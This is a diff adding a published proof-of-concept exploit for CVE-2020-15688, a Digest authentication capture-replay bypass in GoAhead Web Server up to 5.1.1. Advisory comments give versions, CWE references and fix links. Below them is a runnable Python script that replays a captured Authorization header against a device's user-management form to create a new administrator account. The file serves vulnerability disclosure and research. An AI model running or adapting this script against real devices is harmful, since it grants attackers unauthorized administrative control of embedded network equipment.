@@ -1,0 +1,108 @@
+# Exploit Title: GoAhead Web Server 5.1.1 - Digest Authentication Capture Replay Nonce Reuse
+# Date: 2019-08-29
+# Exploit Author: LiquidWorm
+# Software Link: https://www.embedthis.com
+# Version: 5.1.1
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+# EmbedThis GoAhead Web Server 5.1.1 Digest Authentication Capture Replay Nonce Reuse
+#
+#
+# Vendor: Embedthis Software LLC
+# Product web page: https://www.embedthis.com
+# Affected version: <=5.1.1 and <=4.1.2
+# Fixed version: >=5.1.2 and >=4.1.3
+#
+# Summary: GoAhead is the world's most popular, tiny embedded web server. It is compact,
+# secure and simple to use. GoAhead is deployed in hundreds of millions of devices and is
+# ideal for the smallest of embedded devices.
+#
+# Desc: A security vulnerability affecting GoAhead versions 2 to 5 has been identified when
+# using Digest authentication over HTTP. The HTTP Digest Authentication in the GoAhead web
+# server does not completely protect against replay attacks. This allows an unauthenticated
+# remote attacker to bypass authentication via capture-replay if TLS is not used to protect
+# the underlying communication channel. Digest authentication uses a "nonce" value to mitigate
+# replay attacks. GoAhead versions 3 to 5 validated the nonce with a fixed duration of 5 minutes
+# which permitted short-period replays. This duration is too long for most implementations.
+#
+# Tested on: GoAhead-http
+#            GoAhead-Webs
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2020-5598
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5598.php
+#
+# CVE ID: CVE-2020-15688
+# CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15688
+#          https://nvd.nist.gov/vuln/detail/CVE-2020-15688
+#
+# CWE ID: CWE-294 Authentication Bypass by Capture-replay
+# CWE URL: https://cwe.mitre.org/data/definitions/294.html
+# 
+# CWE ID: CWE-323: Reusing a Nonce, Key Pair in Encryption
+# CWE URL: https://cwe.mitre.org/data/definitions/323.html
+#
+# GoAhead Security Alerts / Fix:
+#  https://github.com/embedthis/goahead-gpl/issues/3
+#  https://github.com/embedthis/goahead-gpl/issues/2
+#  https://github.com/embedthis/goahead-gpl/commit/fe0662f945bd7e24b8d621929e1b93d8a7f3f08f#diff-0988df549d878c849d7f2c073319bcb2
+#
+#
+# 29.08.2019
+#
+
+
+#
+# PoC for a network controller running GoAhead web server.
+# Replay Authentication Bypass / Create Admin User
+#
+
+import requests
+import sys#####
+
+if (len(sys.argv) <= 1):
+    print("Usage: ./nen.py <ipaddress>")
+    exit(0)
+
+ip = sys.argv[1]
+
+url = "http://"+ip+"/goform/formUserManagementAdd?lang=en"
+kolache = {"lang":"en"}
+
+replay  = "Digest username=\"admin\", "
+replay += "realm=\"GoAhead\", "
+replay += "nonce=\"5fb3ce6dec423bf8b8f0dfc8cf65244d\", "
+replay += "uri=\"/goform/formUserManagementAdd?lang=en\", "
+replay += "algorithm=MD5, "
+replay += "response=\"1c05f4d08aa0cfcc5318882e0fb4e9af\", "
+replay += "opaque=\"5ccc069c403ebaf9f0171e9517f40e41\", "
+replay += "qop=auth, "
+replay += "nc=0000000a, "
+replay += "cnonce=\"0649f631320f23bb\""
+
+headers = {"Cache-Control": "max-age=0",
+           "Authorization": replay,
+           "Content-Type": "application/x-www-form-urlencoded",
+           "User-Agent": "NoProxy/NoProblem.251",
+           "Accept-Encoding": "gzip, deflate",
+           "Accept-Language": "mk-MK;q=0.9,mk;q=0.8",
+           "Connection": "close"}
+
+data = {"FormSubmitCause": "button",
+        "DefinitionAction": "add",
+        "Define_admin_ID": "admin",
+        "Define_admin_Name": "admin",
+        "Define________Action________ID": '',
+        "Define________Action________Name": "testingus",
+        "Define________Action________Password": "testingus",
+        "Define________Action________Group": "Administrators"}
+
+requests.post(url, headers=headers, cookies=kolache, data=data)
+
+print("Finito")
